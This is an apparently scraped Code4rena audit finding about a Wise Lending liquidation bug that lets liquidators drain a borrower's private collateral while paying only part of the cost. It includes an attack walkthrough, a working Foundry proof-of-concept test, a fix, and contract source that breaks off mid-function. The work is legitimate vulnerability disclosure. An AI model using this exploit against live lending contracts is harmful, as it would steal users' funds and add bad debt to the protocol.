{
  "Title": "[H-04] Liquidators can pay less than required to completely liquidate the private collateral balance of an uncollateralized position",
  "Content": "\nWhen a user deposits in the `WiseLending` contract he can make a private deposit (pure) which allows his deposits not to be used as collateral or a normal deposit. He can also set his position to be collateralized or uncollateralized. If a position is collateralized, the normal deposit can be used as collateral and vice-versa.\n\nWhen a user uncollateralizes his position, he can only use his private deposit as collateral. If the position becomes liquidatable, it means the private deposit can no longer cover the amount borrowed. In the call to `getFullCollateralETH()` below only the private collateral is returned immediately as full collateral if it is uncollateralized.\n\n[WiseSecurityHelper.sol#L198-L208](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurityHelper.sol#L198C1-L208C10)\n\n```solidity\n        ethCollateral = _getTokensInEth(\n            _poolToken,\n            WISE_LENDING.getPureCollateralAmount(\n                _nftId,\n                _poolToken\n            )\n        );\n\n  âŒ     if (_isUncollateralized(_nftId, _poolToken) == true) {\n            return ethCollateral;\n        }\n```\n\nIn a liquidation, the amount to be liquidated is expressed as a percentage of the full collateral. In an uncollateralized position, the full collateral is the private collateral. The `calculateWishPercentage()` call calculates this percentage.\n\n[WiseSecurityHelper.sol#L760-L786](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseSecurity/WiseSecurityHelper.sol#L760-L786)\n\n```solidity\n    function calculateWishPercentage( uint256 _nftId, address _receiveToken, uint256 _paybackETH, uint256 _maxFeeETH, uint256 _baseRewardLiquidation\n    ) external view returns (uint256)\n    {\n        uint256 feeETH = _checkMaxFee(\n            _paybackETH,\n            _baseRewardLiquidation,\n            _maxFeeETH\n        );\n\n        uint256 numerator = (feeETH + _paybackETH)\n            * PRECISION_FACTOR_E18;\n\n        uint256 denominator = getFullCollateralETH(\n            _nftId,\n            _receiveToken\n        );\n\n        return numerator / denominator + 1;\n    }\n```\n\nThe amount to be liquidated, i.e. the amount the liquidator receives, is calculated in [`_calculateReceiveAmount()`](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L543) using the percentage from `calculateWishPercentage()` and applied to the position's pure collateral first in line 557 below.\n\nIt calculates the percentage of the user's normal balance to be reduced in line 569 without checking if it is uncollateralized. If the amount it gets, i.e. `potentialPureExtraCashout`, is greater than zero and less than the current private balance (`pureCollateral`) in line 576, it is reduced from the private balance.\n\n[WiseCore.sol#L564-L586](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L564C1-L586C10)\n\n```solidity\n556:         if (pureCollateralAmount[_nftId][_receiveTokens] > 0) {\n557:             receiveAmount = _withdrawPureCollateralLiquidation(\n558:                 _nftId,\n559:                 _receiveTokens,\n560:                 _removePercentage\n561:             );\n562:         }\n563: \n564:         uint256 potentialPureExtraCashout;\n565:         uint256 userShares = userLendingData[_nftId][_receiveTokens].shares;\n566:         uint256 pureCollateral = pureCollateralAmount[_nftId][_receiveTokens];\n567: \n568:         if (pureCollateral > 0 && userShares > 0) {\n569:             potentialPureExtraCashout = _calculatePotentialPureExtraCashout(\n570:                 userShares,\n571:                 _receiveTokens,\n572:                 _removePercentage\n573:             );\n574:         }\n575: \n576:         if (potentialPureExtraCashout > 0 && potentialPureExtraCashout <= pureCollateral) {\n577:             _decreasePositionMappingValue(\n578:                 pureCollateralAmount,\n579:                 _nftId,\n580:                 _receiveTokens,\n581:                 potentialPureExtraCashout\n582:             );\n583: \n584:             _decreaseTotalBareToken(\n585:                 _receiveTokens,\n586:                 potentialPureExtraCashout\n587:             );\n588: \n589:             return receiveAmount + potentialPureExtraCashout;\n590:         }\n591: \n```\n\nThe issue is the implementation applies the percentage meant for only the private collateral to both the normal and private collateral. It should reduce only the private collateral, but may also reduce the public collateral and send it to the liquidator.\n\nHere's how a malicious liquidator can profit and steal user funds:\n\n1. User deposits `$100` worth of WETH in his private balance and `$100` worth of WETH in his normal balance.\n2. He uncollateralizes his position and borrows `$70` worth of WBTC.\n3. If the price of WBTC he borrowed goes up to `$100`, he can be liquidated.\n4. Assuming no liquidation fees, the liquidator pays `$50` WBTC to liquidate `$50` WETH (50%) from the user's private balance leaving `$50`.\n5. The 50% is applied to the user's public balance giving `$50`. This is also deducted from the private balance leaving `$0` in the private balance.\n6. The liquidator ends up paying only `$50` to earn `$50` extra.\n\nA liquidator can set it up to drain the private collateral balance and only pay for a portion of the liquidation. The user ends up losing funds and the protocol's bad debt increases.\n\n### Impact\n\nThis vulnerability allows the liquidator to steal the user's balance and pay for only a portion of the shares. It has these effects:\n\n1. The user loses funds.\n2. The amount of bad debt in the protocol is increased.\n\n### Proof of Concept\n\nThe `testStealPureBalance()` test below shows a liquidator earning more than the amount he paid for liquidation.\nThe test can be put in any test file in the [contracts](https://github.com/code-423n4/2024-02-wise-lending/tree/main/contracts) directory and ran there.\n\n<details>\n\n```solidity\npragma solidity =0.8.24;\n\nimport \"forge-std/Test.sol\";\n\nimport {WiseLending, PoolManager} from \"./WiseLending.sol\";\nimport {TesterWiseOracleHub} from \"./WiseOracleHub/TesterWiseOracleHub.sol\";\nimport {PositionNFTs} from \"./PositionNFTs.sol\";\nimport {WiseSecurity} from \"./WiseSecurity/WiseSecurity.sol\";\nimport {AaveHub} from \"./WrapperHub/AaveHub.sol\";\nimport {Token} from \"./Token.sol\";\nimport {TesterChainlink} from \"./TesterChainlink.sol\";\n\nimport {IPriceFeed} from \"./InterfaceHub/IPriceFeed.sol\";\nimport {IERC20} from \"./InterfaceHub/IERC20.sol\";\nimport {IWiseLending} from \"./InterfaceHub/IWiseLending.sol\";\n\nimport {ContractLibrary} from \"./PowerFarms/PendlePowerFarmController/ContractLibrary.sol\";\n\ncontract WiseLendingTest is Test, ContractLibrary {\n\n  WiseLending wiseLending;\n  TesterWiseOracleHub oracleHub;\n  PositionNFTs positionNFTs;\n  WiseSecurity wiseSecurity;\n  AaveHub aaveHub;\n  TesterChainlink wbtcOracle;\n\n  // users/admin\n  address alice = address(1);\n  address bob = address(2);\n  address charles = address(3);\n  address lendingMaster;\n\n  //tokens\n  address wbtc;\n\n  function setUp() public {\n    lendingMaster = address(11);\n    vm.startPrank(lendingMaster);\n\n    address ETH_PRICE_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;\n    address UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;\n    address AAVE_ADDRESS = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;\n    \n    // deploy oracle hub\n    oracleHub = new TesterWiseOracleHub(\n      WETH,\n      ETH_PRICE_FEED,\n      UNISWAP_V3_FACTORY\n    );\n    oracleHub.setHeartBeat(\n      oracleHub.ETH_USD_PLACEHOLDER(), // set USD/ETH feed heartbeat\n      1\n    );\n\n    // deploy position NFT\n    positionNFTs = new PositionNFTs(\n        \"PositionsNFTs\",\n        \"POSNFTS\",\n        \"app.wisetoken.net/json-data/nft-data/\"\n    );\n\n    // deploy Wiselending contract\n    wiseLending = new WiseLending(\n      lendingMaster,\n      address(oracleHub),\n      address(positionNFTs)\n    );\n\n    // deploy AaveHub\n    aaveHub = new AaveHub(\n      lendingMaster,\n      AAVE_ADDRESS,\n      address(wiseLending)\n    );\n    \n    // deploy Wisesecurity contract\n    wiseSecurity = new WiseSecurity(\n      lendingMaster,\n      address(wiseLending),\n      address(aaveHub)\n    );\n\n    wiseLending.setSecurity(address(wiseSecurity));\n    // set labels\n    vm.label(address(wiseLending), \"WiseLending\");\n    vm.label(address(positionNFTs), \"PositionNFTs\");\n    vm.label(address(oracleHub), \"OracleHub\");\n    vm.label(address(wiseSecurity), \"WiseSecurity\");\n    vm.label(alice, \"Alice\");\n    vm.label(bob, \"Bob\");\n    vm.label(charles, \"Charles\");\n    vm.label(wbtc, \"WBTC\");\n    vm.label(WETH, \"WETH\");\n\n    // create tokens, create TestChainlink oracle, add to oracleHub\n    (wbtc, wbtcOracle) = _setupToken(18, 17 ether);\n    oracleHub.setHeartBeat(wbtc, 1);\n    wbtcOracle.setRoundData(0, block.timestamp -1);\n    // setup WETH on oracle hub\n    oracleHub.setHeartBeat(WETH, 60 minutes);\n    oracleHub.addOracle(WETH, IPriceFeed(ETH_PRICE_FEED), new address[](0));\n    \n    // create pools\n    wiseLending.createPool(\n      PoolManager.CreatePool({\n        allowBorrow: true,\n        poolToken: wbtc, // btc\n        poolMulFactor: 17500000000000000,\n        poolCollFactor: 805000000000000000,\n        maxDepositAmount: 1800000000000000000000000\n      })\n    );\n\n    wiseLending.createPool(\n      PoolManager.CreatePool({\n        allowBorrow: true,\n        poolToken: WETH, // btc\n        poolMulFactor: 17500000000000000,\n        poolCollFactor: 805000000000000000,\n        maxDepositAmount: 1800000000000000000000000\n      })\n    );\n  }\n\n  function _setupToken(uint decimals, uint value) internal returns (address token, TesterChainlink oracle) {\n    Token _token = new Token(uint8(decimals), alice); // deploy token\n    TesterChainlink _oracle = new TesterChainlink( // deploy oracle\n      value, 18\n    ); \n    oracleHub.addOracle( // add oracle to oracle hub\n      address(_token), \n      IPriceFeed(address(_oracle)), \n      new address[](0)\n    );\n\n    return (address(_token), _oracle);\n  }\n\n  function testStealPureBalance() public {\n    // deposit WETH in private and public balances for Alice's NFT\n    vm.startPrank(alice);\n    deal(WETH, alice, 100 ether);\n    IERC20(WETH).approve(address(wiseLending), 100 ether);\n    uint aliceNft = positionNFTs.reservePosition();\n    wiseLending.depositExactAmount(aliceNft, WETH, 50 ether);\n    wiseLending.solelyDeposit(aliceNft, WETH, 50 ether);\n    \n    // deposit for Bob's NFT to provide WBTC liquidity\n    vm.startPrank(bob);\n    deal(wbtc, bob, 100 ether);\n    IERC20(wbtc).approve(address(wiseLending), 100 ether);\n    wiseLending.depositExactAmountMint(wbtc, 100 ether);\n\n    // Uncollateralize Alice's NFT position to allow only private(pure)\n    // balance to be used as collateral\n    vm.startPrank(alice);\n    wiseLending.unCollateralizeDeposit(aliceNft, WETH);\n    (, , uint lendCollFactor) = wiseLending.lendingPoolData(WETH);\n    uint usableCollateral = 50 ether *  lendCollFactor * 95e16 / 1e36 ;\n    \n    // alice borrows\n    uint borrowable = oracleHub.getTokensFromETH(wbtc, usableCollateral) - 1000;\n    uint paybackShares = wiseLending.borrowExactAmount(aliceNft, wbtc, borrowable);\n\n    vm.startPrank(lendingMaster);\n    // increase the price of WBTC to make Alice's position liquidatable\n    wbtcOracle.setValue(20 ether); \n    \n    // let charles get WBTC to liquidate Alice\n    vm.startPrank(charles);\n    uint charlesNft  = positionNFTs.reservePosition();\n    uint paybackAmount = wiseLending.paybackAmount(wbtc, paybackShares);\n    deal(wbtc, charles, paybackAmount);\n    IERC20(wbtc).approve(address(wiseLending), paybackAmount);\n\n    uint wbtcBalanceBefore = IERC20(wbtc).balanceOf(charles);\n    uint wethBalanceBefore = IERC20(WETH).balanceOf(charles);\n    // charles liquidates 40% of the shares to ensure he can reduce the pure collateral balance twice\n    wiseLending.liquidatePartiallyFromTokens(aliceNft, charlesNft, wbtc, WETH, paybackShares * 40e16/1e18);\n\n    uint wbtcBalanceChange = wbtcBalanceBefore - IERC20(wbtc).balanceOf(charles);\n    uint wethBalanceChange = IERC20(WETH).balanceOf(charles) - wethBalanceBefore;\n    \n    // The amount of WETH Charles got is 2x the amount of WBTC he paid plus fees (10% of amount paid)\n    // WBTC paid plus fees = 110% * wbtcBalanceChange\n    // x2WBTCChangePlusFees = 2 * WBTC paid plus fees\n    uint x2WBTCChangePlusFees = oracleHub.getTokensInETH(wbtc, 11e17 * wbtcBalanceChange / 1e18) * 2;\n    \n    assertApproxEqAbs(wethBalanceChange, x2WBTCChangePlusFees, 200);\n  }\n}\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nTo ensure the code does not also consider the normal balance at all we can check if the position is uncollateralized early. Currently, this check is done but is done too late in the `_calculateReceiveAmount()` function. We can fix it by moving the check.\n\n[WiseCore.sol#L560-L594](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L560C17-L594)\n\n```solidity\n \n+        if (userLendingData[_nftId][_receiveTokens].unCollateralized == true) {\n+            return receiveAmount;\n+        }\n+\n         uint256 potentialPureExtraCashout;\n         uint256 userShares = userLendingData[_nftId][_receiveTokens].shares;\n         uint256 pureCollateral = pureCollateralAmount[_nftId][_receiveTokens];\n         \n         ...\n\n \n-        if (userLendingData[_nftId][_receiveTokens].unCollateralized == true) {\n-            return receiveAmount;\n-        }\n-\n         return _withdrawOrAllocateSharesLiquidation(\n             _nftId,\n             _nftIdLiquidator,\n```\n\n### Assessed type\n\nInvalid Validation\n\n**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/33#issuecomment-2018540660):**\n > Edge case - if user is about to be liquidated, I think they will make things collateralized to avoid liquidation. Either way we would like to see this as Medium. Fix is already applied. This is also something that's been explored in the hats.finance competition; hence, 564-566 lines came from there etc.\n\n**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/33#issuecomment-2021005286):**\n > High is appropriate, especially with the PoC demonstrated.\n\n**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/33#issuecomment-2082900496):**\n> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2024-02-wise-lending",
  "Code": [
    {
      "filename": "contracts/WiseSecurity/WiseSecurityHelper.sol",
      "content": "// SPDX-License-Identifier: -- WISE --\n\npragma solidity =0.8.24;\n\nimport \"./WiseSecurityDeclarations.sol\";\n\nabstract contract WiseSecurityHelper is WiseSecurityDeclarations {\n\n    /**\n     * @dev Read function returning weighted and\n     * and unweighted total collateral of a\n     * postion with {_nftId} (unweighted means\n     * collateral factor equals 1E18).\n     */\n    function overallETHCollateralsBoth(\n        uint256 _nftId\n    )\n        public\n        view\n        returns (uint256, uint256)\n    {\n        uint256 amount;\n        uint256 weightedTotal;\n        uint256 unweightedAmount;\n        address tokenAddress;\n\n        uint256 i;\n        uint256 l = WISE_LENDING.getPositionLendingTokenLength(\n            _nftId\n        );\n\n        while (i < l) {\n\n            tokenAddress = WISE_LENDING.getPositionLendingTokenByIndex(\n                _nftId,\n                i\n            );\n\n            amount = getFullCollateralETH(\n                _nftId,\n                tokenAddress\n            );\n\n            weightedTotal += amount\n                * WISE_LENDING.lendingPoolData(tokenAddress).collateralFactor\n                / PRECISION_FACTOR_E18;\n\n            unweightedAmount += amount;\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        return (\n            weightedTotal,\n            unweightedAmount\n        );\n    }\n\n    /**\n     * @dev Read function returning weighted\n     *  total collateral of a postion with {_nftId}.\n     */\n    function overallETHCollateralsWeighted(\n        uint256 _nftId\n    )\n        public\n        view\n        returns (uint256 weightedTotal)\n    {\n        address tokenAddress;\n\n        uint256 i;\n        uint256 l = WISE_LENDING.getPositionLendingTokenLength(\n            _nftId\n        );\n\n        while (i < l) {\n\n            tokenAddress = WISE_LENDING.getPositionLendingTokenByIndex(\n                _nftId,\n                i\n            );\n\n            _checkPoolCondition(\n                tokenAddress\n            );\n\n            weightedTotal += WISE_LENDING.lendingPoolData(tokenAddress).collateralFactor\n                * getFullCollateralETH(\n                    _nftId,\n                    tokenAddress\n                ) / PRECISION_FACTOR_E18;\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Read function returning unweighted\n     *  total collateral of a postion with {_nftId}\n     * (unweighted means collateral factor equals 1E18).\n     */\n    function overallETHCollateralsBare(\n        uint256 _nftId\n    )\n        public\n        view\n        returns (uint256 amount)\n    {\n        address tokenAddress;\n\n        uint256 i;\n        uint256 l = WISE_LENDING.getPositionLendingTokenLength(\n            _nftId\n        );\n\n        while (i < l) {\n\n            tokenAddress = WISE_LENDING.getPositionLendingTokenByIndex(\n                _nftId,\n                i\n            );\n\n            amount += getFullCollateralETH(\n                _nftId,\n                tokenAddress\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Internal calculation function returning\n     * the updated weighted collateral amount of a\n     * postion with {_nftId}. Result can be\n     * extrapolated linear with length {_interval}.\n     */\n    function _overallETHCollateralsWeighted(\n        uint256 _nftId,\n        uint256 _interval\n    )\n        internal\n        view\n        returns (uint256 weightedTotal)\n    {\n        uint256 i;\n        address tokenAddress;\n\n        uint256 l = WISE_LENDING.getPositionLendingTokenLength(\n            _nftId\n        );\n\n        while (i < l) {\n\n            tokenAddress = WISE_LENDING.getPositionLendingTokenByIndex(\n                _nftId,\n                i\n            );\n\n            _checkPoolCondition(\n                tokenAddress\n            );\n\n            weightedTotal += WISE_LENDING.lendingPoolData(tokenAddress).collateralFactor\n                * _getCollateralOfTokenETHUpdated(\n                    _nftId,\n                    tokenAddress,\n                    _interval\n                ) / PRECISION_FACTOR_E18;\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Read function returning the full bare\n     * collateral amount of a {_poolToken} from a\n     * {_nftId}. Full means sum of private and\n     * public added funds.\n     */\n    function getFullCollateralETH(\n        uint256 _nftId,\n        address _poolToken\n    )\n        public\n        view\n        returns (uint256 ethCollateral)\n    {\n        ethCollateral = _getTokensInEth(\n            _poolToken,\n            WISE_LENDING.getPureCollateralAmount(\n                _nftId,\n                _poolToken\n            )\n        );\n\n        if (_isUncollateralized(_nftId, _poolToken) == true) {\n            return ethCollateral;\n        }\n\n        if (WISE_LENDING.getPositionLendingShares(_nftId, _poolToken) == 0) {\n            return ethCollateral;\n        }\n\n        ethCollateral += getETHCollateral(\n            _nftId,\n            _poolToken\n        );\n    }\n\n    /**\n     * @dev Wrapper function checking if a supplied\n     * fund is uncollateralized.\n     */\n    function _isUncollateralized(\n        uint256 _nftId,\n        address _poolToken\n    )\n        internal\n        view\n        returns (bool)\n    {\n        return WISE_LENDING.isUncollateralized(\n            _nftId,\n            _poolToken\n        );\n    }\n\n    /**\n     * @dev Read function returning the full\n     * collateral amount of a {_poolToken} from a\n     * {_nftId} updated to current values.\n     * Full means sum of private and public added\n     * funds. Can be extrapolated linear within\n     * {_interval}.\n     */\n    function _getCollateralOfTokenETHUpdated(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _interval\n    )\n        internal\n        view\n        returns (uint256 ethCollateral)\n    {\n        ethCollateral = _getTokensInEth(\n            _poolToken,\n            WISE_LENDING.getPureCollateralAmount(\n                _nftId,\n                _poolToken\n            )\n        );\n\n        if (_isUncollateralized(_nftId, _poolToken) == true) {\n            return ethCollateral;\n        }\n\n        ethCollateral += getETHCollateralUpdated(\n            _nftId,\n            _poolToken,\n            _interval\n        );\n    }\n\n    /**\n     * @dev Read function returning the full\n     * (private and public) collateral amount\n     * of a {_poolToken} from a {_nftId} updated\n     * to current values. Can be extrapolated\n     * linear within {_interval}.\n     */\n    function getETHCollateralUpdated(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _interval\n    )\n        public\n        view\n        returns (uint256)\n    {\n        uint256 lendingShares = WISE_LENDING.getPositionLendingShares(\n            _nftId,\n            _poolToken\n        );\n\n        if (lendingShares == 0) {\n            return 0;\n        }\n\n        uint256 currentTotalLendingShares = WISE_LENDING.getTotalDepositShares(\n            _poolToken\n        );\n\n        uint256 updatedPseudo = _getUpdatedPseudoPool(\n            _poolToken,\n            _interval\n        );\n\n        uint256 updatedToken = lendingShares\n            * updatedPseudo\n            / currentTotalLendingShares;\n\n        return _getTokensInEth(\n            _poolToken,\n            updatedToken\n        );\n    }\n\n    /**\n     * @dev Read function returning the public\n     * collateral amount of a {_poolToken} from a\n     * {_nftId}.\n     */\n    function getETHCollateral(\n        uint256 _nftId,\n        address _poolToken\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return _getTokensInEth(\n            _poolToken,\n            getPositionLendingAmount(\n                _nftId,\n                _poolToken\n            )\n        );\n    }\n\n    function _getTokensInEth(\n        address _poolToken,\n        uint256 _amount\n    )\n        internal\n        view\n        returns (uint256)\n    {\n        return WISE_ORACLE.getTokensInETH(\n            _poolToken,\n            _amount\n        );\n    }\n\n    /**\n     * @dev Read function returning the total\n     * borrow amount of a postion with {_nftId}.\n     * No heartbeat or blacklisted checks are\n     * included in this function!\n     */\n    function overallETHBorrowBare(\n        uint256 _nftId\n    )\n        public\n        view\n        returns (uint256 buffer)\n    {\n        uint256 i;\n        uint256 l = WISE_LENDING.getPositionBorrowTokenLength(\n            _nftId\n        );\n\n        while (i < l) {\n\n            buffer += getETHBorrow(\n                _nftId,\n                WISE_LENDING.getPositionBorrowTokenByIndex(\n                    _nftId,\n                    i\n                )\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Read function returning the total\n     * borrow amount of a postion with {_nftId}.\n     * No blacklisted check is included\n     * in this function!\n     */\n    function overallETHBorrowHeartbeat(\n        uint256 _nftId\n    )\n        public\n        view\n        returns (uint256 buffer)\n    {\n        address tokenAddress;\n\n        uint256 i;\n        uint256 l = WISE_LENDING.getPositionBorrowTokenLength(\n            _nftId\n        );\n\n        while (i < l) {\n\n            tokenAddress = WISE_LENDING.getPositionBorrowTokenByIndex(\n                _nftId,\n                i\n            );\n\n            buffer += getETHBorrow(\n                _nftId,\n                tokenAddress\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Read function returning the total\n     * borrow amount of a postion with {_nftId}.\n     */\n    function overallETHBorrow(\n        uint256 _nftId\n    )\n        public\n        view\n        returns (uint256 buffer)\n    {\n        uint256 i;\n        address tokenAddress;\n\n        uint256 l = WISE_LENDING.getPositionBorrowTokenLength(\n            _nftId\n        );\n\n        while (i < l) {\n\n            tokenAddress = WISE_LENDING.getPositionBorrowTokenByIndex(\n                _nftId,\n                i\n            );\n\n            _checkPoolCondition(\n                tokenAddress\n            );\n\n            buffer += getETHBorrow(\n                _nftId,\n                tokenAddress\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Internal function combining hearbeat\n     * and blacklisted checks.\n     */\n    function _checkBlacklisted(\n        address _poolToken\n    )\n        internal\n        view\n        returns (bool)\n    {\n        return wasBlacklisted[_poolToken] == true;\n    }\n\n    /**\n     * @dev Read function returning the total\n     * updated current borrow amount of a\n     * postion with {_nftId}. Can be\n     * extrapolated linear with {_intervall}.\n     */\n    function _overallETHBorrow(\n        uint256 _nftId,\n        uint256 _interval\n    )\n        internal\n        view\n        returns (uint256 buffer)\n    {\n        uint256 i;\n        address tokenAddress;\n\n        uint256 l = WISE_LENDING.getPositionBorrowTokenLength(\n            _nftId\n        );\n\n        while (i < l) {\n\n            tokenAddress = WISE_LENDING.getPositionBorrowTokenByIndex(\n                _nftId,\n                i\n            );\n\n            _checkPoolCondition(\n                tokenAddress\n            );\n\n            buffer += _getETHBorrowUpdated(\n                _nftId,\n                tokenAddress,\n                _interval\n            );\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /**\n     * @dev Internal function calculating\n     * the updated pseudo borrow amount of\n     * {_poolToken}. Result can be extrapolated\n     * linear with {_interval}.\n     */\n    function _getUpdatedPseudoBorrow(\n        address _poolToken,\n        uint256 _interval\n    )\n        internal\n        view\n        returns (uint256)\n    {\n        uint256 currentPseudo = WISE_LENDING.getPseudoTotalBorrowAmount(\n            _poolToken\n        );\n\n        return _getInterest(\n            _poolToken,\n            _interval\n        ) + currentPseudo;\n    }\n\n    /**\n     * @dev Internal function calculating\n     * the updated pseudo lending amount of\n     * {_poolToken}. Result can be extrapolated\n     * linear with {_interval}.\n     */\n    function _getUpdatedPseudoPool(\n        address _poolToken,\n        uint256 _interval\n    )\n        internal\n        view\n        returns (uint256)\n    {\n        uint256 currentPseudo = WISE_LENDING.getPseudoTotalPool(\n            _poolToken\n        );\n\n        return _getInterest(_poolToken, _interval)\n            * (PRECISION_FACTOR_E18 - WISE_LENDING.globalPoolData(_poolToken).poolFee)\n            / PRECISION_FACTOR_E18\n            + currentPseudo;\n    }\n\n    /**\n     * @dev Internal math function calculating\n     * the accumulated interest amount for\n     * {_poolToken}. Result can be extrapolated\n     * linear with {_interval}.\n     */\n    function _getInterest(\n        address _poolToken,\n        uint256 _interval\n    )\n        internal\n        view\n        returns (uint256)\n    {\n        BorrowPoolEntry memory borrowPoolData = WISE_LENDING.borrowPoolData(\n            _poolToken\n        );\n\n        uint256 timeInterval = _interval\n            + block.timestamp\n            - WISE_LENDING.getTimeStamp(_poolToken);\n\n        uint256 rate = timeInterval\n            * borrowPoolData.borrowRate\n            * WISE_LENDING.getPseudoTotalBorrowAmount(_poolToken)\n            / PRECISION_FACTOR_E18\n            / ONE_YEAR;\n\n        return rate;\n    }\n\n    /**\n     * @dev Read function returning the full\n     * borrow amount of a {_poolToken} from a\n     * {_nftId} updated to current values.\n     * Can be extrapolated linear within\n     * {_interval}.\n     */\n    function _getETHBorrowUpdated(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _intervall\n    )\n        internal\n        view\n        returns (uint256)\n    {\n        uint256 borrowShares = WISE_LENDING.getPositionBorrowShares(\n            _nftId,\n            _poolToken\n        );\n\n        if (borrowShares == 0) {\n            return 0;\n        }\n\n        uint256 currentTotalBorrowShares = WISE_LENDING.getTotalBorrowShares(\n            _poolToken\n        );\n\n        uint256 updatesPseudo = _getUpdatedPseudoBorrow(\n            _poolToken,\n            _intervall\n        );\n\n        uint256 updatedToken = borrowShares\n            * updatesPseudo\n            / currentTotalBorrowShares;\n\n        return _getTokensInEth(\n            _poolToken,\n            updatedToken\n        );\n    }\n\n    /**\n     * @dev Read function returning the borow\n     * amount of a {_poolToken} from a {_nftId}.\n     */\n    function getETHBorrow(\n        uint256 _nftId,\n        address _poolToken\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return _getTokensInEth(\n            _poolToken,\n            getPositionBorrowAmount(\n                _nftId,\n                _poolToken\n            )\n        );\n    }\n\n    /**\n     * @dev Read function checking if\n     * {_poolToken} is allowed to borrow.\n     */\n    function checkTokenAllowed(\n        address _poolAddress\n    )\n        public\n        view\n    {\n        if (WISE_LENDING.borrowPoolData(_poolAddress).allowBorrow == false) {\n            revert NotAllowedToBorrow();\n        }\n    }\n\n    /**\n     * @dev Check if chainLink feed was\n     * updated within expected timeframe\n     */\n    function checkHeartbeat(\n        address _poolToken\n    )\n        public\n        view\n        returns (bool)\n    {\n        return WISE_ORACLE.chainLinkIsDead(_poolToken) == false;\n    }\n\n    /**\n     * @dev Check if the postion with\n     * {_nftId} is locked for interactions.\n     */\n    function _checkPositionLocked(\n        uint256 _nftId\n    )\n        internal\n        view\n    {\n        if (WISE_LENDING.positionLocked(_nftId) == true) {\n            revert PositionLockedWiseSecurity();\n        }\n    }\n\n    /**\n     * @dev Wrapper function for external\n     * {_checkMaxFee} call.\n     */\n    function checkMaxFee(\n        uint256 _paybackETH,\n        uint256 _feeLiquidation,\n        uint256 _maxFeeETH\n    )\n        external\n        pure\n        returns (uint256)\n    {\n        return _checkMaxFee(\n            _paybackETH,\n            _feeLiquidation,\n            _maxFeeETH\n        );\n    }\n\n    /**\n     * @dev Returning the possible fee\n     * for liquidation.\n     */\n    function _checkMaxFee(\n        uint256 _paybackETH,\n        uint256 _liquidationFee,\n        uint256 _maxFeeETH\n    )\n        internal\n        pure\n        returns (uint256)\n    {\n        uint256 feeETH = _paybackETH\n            * _liquidationFee\n            / PRECISION_FACTOR_E18;\n\n        return feeETH < _maxFeeETH\n            ? feeETH\n            : _maxFeeETH;\n    }\n\n    /**\n     * @dev Math function computing the\n     * percentage of the receiving token\n     * which the liquidator receivs for\n     * liquidation.\n     */\n    function calculateWishPercentage(\n        uint256 _nftId,\n        address _receiveToken,\n        uint256 _paybackETH,\n        uint256 _maxFeeETH,\n        uint256 _baseRewardLiquidation\n    )\n        external\n        view\n        returns (uint256)\n    {\n        uint256 feeETH = _checkMaxFee(\n            _paybackETH,\n            _baseRewardLiquidation,\n            _maxFeeETH\n        );\n\n        uint256 numerator = (feeETH + _paybackETH)\n            * PRECISION_FACTOR_E18;\n\n        uint256 denominator = getFullCollateralETH(\n            _nftId,\n            _receiveToken\n        );\n\n        return numerator / denominator + 1;\n    }\n\n    /**\n     * @dev Check function for withdraw flow.\n     * Tests if debt ratio is not greater than\n     * 100% after withdraw of {_poolToken} for\n     * {_amount}.\n     */\n    function _checkHealthState(\n        uint256 _nftId,\n        bool _powerFarm\n    )\n        internal\n        view\n    {\n        if (_getState(_nftId, _powerFarm) == true) {\n            revert ResultsInBadDebt();\n        }\n    }\n\n    function _getState(\n        uint256 _nftId,\n        bool _powerFarm\n    )\n        internal\n        view\n        returns (bool)\n    {\n        uint256 borrowAmount = overallETHBorrow(\n            _nftId\n        );\n\n        if (borrowAmount == 0) {\n            return false;\n        }\n\n        uint256 overallCollateral = _powerFarm == true\n            ? overallETHCollateralsBare(_nftId)\n            : overallETHCollateralsWeighted(_nftId);\n\n        return overallCollateral\n            * BORROW_PERCENTAGE_CAP\n            / PRECISION_FACTOR_E18\n            < borrowAmount;\n    }\n\n    /**\n     * @dev Check function for registration\n     * of power farms. User can only register\n     * when the postion is empty!\n     */\n    function checksRegister(\n        uint256 _nftId,\n        address _caller\n    )\n        public\n        view\n    {\n        checkOwnerPosition(\n            _nftId,\n            _caller\n        );\n\n        if (overallETHCollateralsWeighted(_nftId) > 0) {\n            revert NotAllowedWiseSecurity();\n        }\n    }\n\n    /**\n     * @dev Pure math function comparing\n     * borrow and collateral amount for\n     * liquidation.\n     */\n    